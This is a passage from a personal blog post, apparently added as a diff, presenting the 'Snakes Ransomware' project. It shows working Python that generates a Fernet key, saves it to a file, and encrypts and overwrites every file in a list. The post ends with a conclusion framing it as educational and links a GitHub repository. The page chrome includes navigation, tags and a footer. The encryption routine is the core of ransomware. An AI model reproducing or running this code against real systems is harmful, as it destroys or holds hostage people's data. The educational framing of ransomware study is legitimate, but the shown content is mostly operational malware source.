+<span class="line"><span style="color:#E1E4E8">key </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> Fernet.generate_key()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"snakes-key.key"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"wb"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> thekey:</span></span>
+<span class="line"><span style="color:#E1E4E8">    thekey.write(key)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Encrypt each file</span></span>
+<span class="line"><span style="color:#F97583">for</span><span style="color:#FFAB70"> file</span><span style="color:#F97583"> in</span><span style="color:#E1E4E8"> files:</span></span>
+<span class="line"><span style="color:#F97583">    with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">file</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"rb"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> thefile:</span></span>
+<span class="line"><span style="color:#E1E4E8">        contents </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> thefile.read()</span></span>
+<span class="line"><span style="color:#E1E4E8">    contents_encrypted </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> Fernet(key).encrypt(contents)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">    with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">file</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"wb"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> thefile:</span></span>
+<span class="line"><span style="color:#E1E4E8">        thefile.write(contents_encrypted)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Encryption completed."</span><span style="color:#E1E4E8">)</span></span></code></pre>
+<h2 id="conclusion">Conclusion</h2>
+<p>Ransomware remains one of the most significant threats in cybersecurity today. By understanding how it works through projects like Snakes Ransomware, we can better prepare ourselves to defend against such attacks. Remember, the Snakes Ransomware project is strictly for educational purposes, and I strongly discourage any malicious use of this knowledge.</p>
+<p>For more insights into cybersecurity and programming, stay tuned to Krishna-Blogs!</p>
+<hr>
+<p><a href="https://github.com/Snakes-n-Networks/Snakes-Ransomware.git">Github Repo</a> — For referance</p>
+<p>Contact: <a href="mailto:ekrishnachaitanya2004@gmail.com">P-mail</a> ‘or’
+<a href="mailto:snakesnnetworks@gmail.com">Official-mail</a></p> </div> <p class="kanit-regular text-center text-balance text-xs" data-astro-cid-gsbvazvt>
+Tagged: <a href="/tags/docs" class="button-link px-4! m-2" data-astro-cid-gsbvazvt="true">docs</a><a href="/tags/ransomware" class="button-link px-4! m-2" data-astro-cid-gsbvazvt="true">ransomware</a><a href="/tags/project" class="button-link px-4! m-2" data-astro-cid-gsbvazvt="true">project</a><a href="/tags/cyberattack" class="button-link px-4! m-2" data-astro-cid-gsbvazvt="true">cyberattack</a><a href="/tags/snakes-ransomware" class="button-link px-4! m-2" data-astro-cid-gsbvazvt="true">snakes ransomware</a> </p> <div class="flex flex-col sm:flex-row items-center justify-center gap-4 my-8" data-astro-cid-gsbvazvt> <a href="/blog" class="button-link back-link" data-astro-cid-gsbvazvt="true"> <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 fill-current mr-4" data-astro-cid-gsbvazvt="true"> <path d="M19.714 12c0 0.533-0.432 0.964-0.964 0.964v0h-11.172l4.14 4.138c0.175 0.175 0.283 0.416 0.283 0.683 0 0.533-0.432 0.965-0.965 0.965-0.267 0-0.508-0.108-0.683-0.283v0l-5.785-5.785c-0.175-0.175-0.283-0.416-0.283-0.683s0.108-0.508 0.283-0.683l5.785-5.785c0.175-0.175 0.416-0.283 0.683-0.283 0.533 0 0.965 0.432 0.965 0.965 0 0.267-0.108 0.508-0.283 0.683v0l-4.14 4.138h11.172c0.533 0 0.964 0.432 0.964 0.964v0z"></path> </svg> Back to All Stories
+</a> <a href="/blog/ransomware" class="button-link back-link text-balance" data-astro-cid-gsbvazvt="true">
+Next Post: Inside the Mind of Ransomware - My Experience and Insights <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 fill-current ml-4" data-astro-cid-gsbvazvt="true"> <path d="M4.286 12c0-0.533 0.432-0.964 0.964-0.964v0h11.172l-4.14-4.138c-0.175-0.175-0.283-0.416-0.283-0.683 0-0.533 0.432-0.965 0.965-0.965 0.267 0 0.508 0.108 0.683 0.283v0l5.785 5.785c0.175 0.175 0.283 0.416 0.283 0.683s-0.108 0.508-0.283 0.683l-5.785 5.785c-0.175 0.175-0.416 0.283-0.683 0.283-0.533 0-0.965-0.432-0.965-0.965 0-0.267 0.108-0.508 0.283-0.683v0l4.14-4.138h-11.172c-0.533 0-0.964-0.432-0.964-0.964v0z"></path> </svg> </a> </div> </div>   <footer class="kanit-light text-xs sm:text-sm"> <div class="footer-primary flex flex-col items-center justify-center min-w-full border-t border-gray-500/50"> <div class="flex flex-row items-center justify-around sm:justify-center gap-2 sm:gap-6 pt-6 pb-3 sm:px-6 text-center"> <a href="/about" title="About"> About </a><a href="/contact" title="Contact"> Contact </a><a href="/rss.xml" title="RSS Feed"> RSS Feed </a> </div> </div> <div class="footer-secondary flex flex-col sm:flex-row items-center justify-between gap-6 min-w-full"> <div class="flex flex-row gap-2 items-center justify-start text-balance"> <span>&copy; 2026</span> Krishna. All rights reserved.
+</div> <div class="flex flex-row gap-4 items-center justify-end-safe"> <a href="https://instagram.com/" title="Instagram" target="_blank"> Instagram </a><a href="https://twitter.com/" title="Twitter" target="_blank"> Twitter </a><a href="https://linkedin.com/" title="LinkedIn" target="_blank"> LinkedIn </a> </div> </div> <div class="footer-identity h-40 sm:h-18 text-center overflow-clip sticky bottom-0 items-end"> <span class="sigmar-ff text-8xl sm:text-[6.5rem] leading-none text-whitesmoke/50 dark:text-gray-300/30 sm:whitespace-nowrap">Krishna</span> </div> </footer> </main> </body></html> 
